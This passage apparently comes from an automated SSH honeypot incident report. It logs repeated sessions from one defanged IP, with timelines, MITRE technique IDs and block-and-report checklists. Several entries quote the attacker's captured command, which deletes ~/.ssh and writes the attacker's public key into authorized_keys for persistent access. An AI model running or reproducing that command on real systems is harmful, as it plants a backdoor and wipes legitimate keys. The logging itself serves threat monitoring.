| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:47:56` | `cowrie.session.connect` |
| `2026-04-16 14:47:56` | `cowrie.client.version` |
| `2026-04-16 14:47:57` | `cowrie.client.kex` |
| `2026-04-16 14:47:58` | `cowrie.login.success` |
| `2026-04-16 14:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d01ba84d1c9c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:49 |
| **Last Seen** | 2026-04-16 14:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:49:45` | `cowrie.session.connect` |
| `2026-04-16 14:49:45` | `cowrie.client.version` |
| `2026-04-16 14:49:46` | `cowrie.client.kex` |
| `2026-04-16 14:49:47` | `cowrie.login.success` |
| `2026-04-16 14:49:47` | `cowrie.session.params` |
| `2026-04-16 14:49:47` | `cowrie.command.input` |
| `2026-04-16 14:49:47` | `cowrie.command.failed` |
| `2026-04-16 14:49:48` | `cowrie.log.closed` |
| `2026-04-16 14:49:48` | `cowrie.session.params` |
| `2026-04-16 14:49:48` | `cowrie.command.input` |
| `2026-04-16 14:49:49` | `cowrie.session.file_download` |
| `2026-04-16 14:49:49` | `cowrie.log.closed` |
| `2026-04-16 14:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69244b568bd2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:49 |
| **Last Seen** | 2026-04-16 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:49:52` | `cowrie.session.connect` |
| `2026-04-16 14:49:52` | `cowrie.client.version` |
| `2026-04-16 14:49:52` | `cowrie.client.kex` |
| `2026-04-16 14:49:54` | `cowrie.login.success` |
| `2026-04-16 14:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c1538c71b5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:51 |
| **Last Seen** | 2026-04-16 14:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:51:44` | `cowrie.session.connect` |
| `2026-04-16 14:51:44` | `cowrie.client.version` |
| `2026-04-16 14:51:44` | `cowrie.client.kex` |
| `2026-04-16 14:51:46` | `cowrie.login.success` |
| `2026-04-16 14:51:46` | `cowrie.session.params` |
| `2026-04-16 14:51:46` | `cowrie.command.input` |
| `2026-04-16 14:51:46` | `cowrie.command.failed` |
| `2026-04-16 14:51:46` | `cowrie.log.closed` |
| `2026-04-16 14:51:47` | `cowrie.session.params` |
| `2026-04-16 14:51:47` | `cowrie.command.input` |
| `2026-04-16 14:51:47` | `cowrie.session.file_download` |
| `2026-04-16 14:51:47` | `cowrie.log.closed` |
| `2026-04-16 14:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6266d1237198

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:51 |
| **Last Seen** | 2026-04-16 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:51:51` | `cowrie.session.connect` |
| `2026-04-16 14:51:51` | `cowrie.client.version` |
| `2026-04-16 14:51:51` | `cowrie.client.kex` |
| `2026-04-16 14:51:52` | `cowrie.login.success` |
| `2026-04-16 14:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-506098b4e1b0

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:53 |
| **Last Seen** | 2026-04-16 14:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:53:38` | `cowrie.session.connect` |
| `2026-04-16 14:53:38` | `cowrie.client.version` |
| `2026-04-16 14:53:38` | `cowrie.client.kex` |
| `2026-04-16 14:53:40` | `cowrie.login.success` |
| `2026-04-16 14:53:40` | `cowrie.session.params` |
| `2026-04-16 14:53:40` | `cowrie.command.input` |
| `2026-04-16 14:53:40` | `cowrie.command.failed` |
| `2026-04-16 14:53:41` | `cowrie.log.closed` |
| `2026-04-16 14:53:41` | `cowrie.session.params` |
| `2026-04-16 14:53:41` | `cowrie.command.input` |
| `2026-04-16 14:53:42` | `cowrie.session.file_download` |
| `2026-04-16 14:53:42` | `cowrie.log.closed` |
| `2026-04-16 14:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31e667f134c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:53 |
| **Last Seen** | 2026-04-16 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:53:45` | `cowrie.session.connect` |
| `2026-04-16 14:53:45` | `cowrie.client.version` |
| `2026-04-16 14:53:45` | `cowrie.client.kex` |
| `2026-04-16 14:53:47` | `cowrie.login.success` |
| `2026-04-16 14:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f149998f2ab

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:55 |
| **Last Seen** | 2026-04-16 14:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:55:31` | `cowrie.session.connect` |
| `2026-04-16 14:55:31` | `cowrie.client.version` |
| `2026-04-16 14:55:31` | `cowrie.client.kex` |
| `2026-04-16 14:55:33` | `cowrie.login.success` |
| `2026-04-16 14:55:33` | `cowrie.session.params` |
| `2026-04-16 14:55:33` | `cowrie.command.input` |
| `2026-04-16 14:55:33` | `cowrie.command.failed` |
| `2026-04-16 14:55:33` | `cowrie.log.closed` |
| `2026-04-16 14:55:34` | `cowrie.session.params` |
| `2026-04-16 14:55:34` | `cowrie.command.input` |
| `2026-04-16 14:55:34` | `cowrie.session.file_download` |
| `2026-04-16 14:55:34` | `cowrie.log.closed` |
| `2026-04-16 14:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aea5ae9555b6

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:55 |
| **Last Seen** | 2026-04-16 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:55:38` | `cowrie.session.connect` |
| `2026-04-16 14:55:38` | `cowrie.client.version` |
| `2026-04-16 14:55:38` | `cowrie.client.kex` |
| `2026-04-16 14:55:39` | `cowrie.login.success` |
| `2026-04-16 14:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377e79e44832

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:57 |
| **Last Seen** | 2026-04-16 14:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:57:26` | `cowrie.session.connect` |
| `2026-04-16 14:57:26` | `cowrie.client.version` |
| `2026-04-16 14:57:27` | `cowrie.client.kex` |
| `2026-04-16 14:57:28` | `cowrie.login.success` |
| `2026-04-16 14:57:28` | `cowrie.session.params` |
| `2026-04-16 14:57:28` | `cowrie.command.input` |
| `2026-04-16 14:57:28` | `cowrie.command.failed` |
| `2026-04-16 14:57:29` | `cowrie.log.closed` |
| `2026-04-16 14:57:29` | `cowrie.session.params` |
| `2026-04-16 14:57:29` | `cowrie.command.input` |
| `2026-04-16 14:57:30` | `cowrie.session.file_download` |
| `2026-04-16 14:57:30` | `cowrie.log.closed` |
| `2026-04-16 14:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7548d60b6897

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 14:57 |
| **Last Seen** | 2026-04-16 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:57:33` | `cowrie.session.connect` |
| `2026-04-16 14:57:33` | `cowrie.client.version` |
| `2026-04-16 14:57:33` | `cowrie.client.kex` |
| `2026-04-16 14:57:35` | `cowrie.login.success` |
| `2026-04-16 14:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aff534afa39

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:03 |
| **Last Seen** | 2026-04-16 15:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:03:03` | `cowrie.session.connect` |
| `2026-04-16 15:03:03` | `cowrie.client.version` |
| `2026-04-16 15:03:03` | `cowrie.client.kex` |
| `2026-04-16 15:03:04` | `cowrie.login.success` |
| `2026-04-16 15:03:05` | `cowrie.session.params` |
| `2026-04-16 15:03:05` | `cowrie.command.input` |
| `2026-04-16 15:03:05` | `cowrie.command.failed` |
| `2026-04-16 15:03:05` | `cowrie.log.closed` |
| `2026-04-16 15:03:06` | `cowrie.session.params` |
| `2026-04-16 15:03:06` | `cowrie.command.input` |
| `2026-04-16 15:03:06` | `cowrie.session.file_download` |
| `2026-04-16 15:03:06` | `cowrie.log.closed` |
| `2026-04-16 15:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d733cc37df58

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:03 |
| **Last Seen** | 2026-04-16 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:03:10` | `cowrie.session.connect` |
| `2026-04-16 15:03:10` | `cowrie.client.version` |
| `2026-04-16 15:03:10` | `cowrie.client.kex` |
| `2026-04-16 15:03:11` | `cowrie.login.success` |
| `2026-04-16 15:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1edc7e2fae5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:05 |
| **Last Seen** | 2026-04-16 15:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:05:05` | `cowrie.session.connect` |
| `2026-04-16 15:05:05` | `cowrie.client.version` |
| `2026-04-16 15:05:06` | `cowrie.client.kex` |
| `2026-04-16 15:05:07` | `cowrie.login.success` |
| `2026-04-16 15:05:08` | `cowrie.session.params` |
| `2026-04-16 15:05:08` | `cowrie.command.input` |
| `2026-04-16 15:05:08` | `cowrie.command.failed` |
| `2026-04-16 15:05:08` | `cowrie.log.closed` |
| `2026-04-16 15:05:09` | `cowrie.session.params` |
| `2026-04-16 15:05:09` | `cowrie.command.input` |
| `2026-04-16 15:05:09` | `cowrie.session.file_download` |
| `2026-04-16 15:05:09` | `cowrie.log.closed` |
| `2026-04-16 15:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7066ea8b5c48

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:05 |
| **Last Seen** | 2026-04-16 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:05:12` | `cowrie.session.connect` |
| `2026-04-16 15:05:12` | `cowrie.client.version` |
| `2026-04-16 15:05:13` | `cowrie.client.kex` |
| `2026-04-16 15:05:14` | `cowrie.login.success` |
| `2026-04-16 15:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20782c6848d9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:08 |
| **Last Seen** | 2026-04-16 15:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:08:48` | `cowrie.session.connect` |
| `2026-04-16 15:08:48` | `cowrie.client.version` |
| `2026-04-16 15:08:48` | `cowrie.client.kex` |
| `2026-04-16 15:08:49` | `cowrie.login.success` |
| `2026-04-16 15:08:50` | `cowrie.session.params` |
| `2026-04-16 15:08:50` | `cowrie.command.input` |
| `2026-04-16 15:08:50` | `cowrie.command.failed` |
| `2026-04-16 15:08:50` | `cowrie.log.closed` |
| `2026-04-16 15:08:51` | `cowrie.session.params` |
| `2026-04-16 15:08:51` | `cowrie.command.input` |
| `2026-04-16 15:08:51` | `cowrie.session.file_download` |
| `2026-04-16 15:08:51` | `cowrie.log.closed` |
| `2026-04-16 15:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f391f6d8242f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:08 |
| **Last Seen** | 2026-04-16 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:08:55` | `cowrie.session.connect` |
| `2026-04-16 15:08:55` | `cowrie.client.version` |
| `2026-04-16 15:08:55` | `cowrie.client.kex` |
| `2026-04-16 15:08:56` | `cowrie.login.success` |
| `2026-04-16 15:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7409f150e957

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:14 |
| **Last Seen** | 2026-04-16 15:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
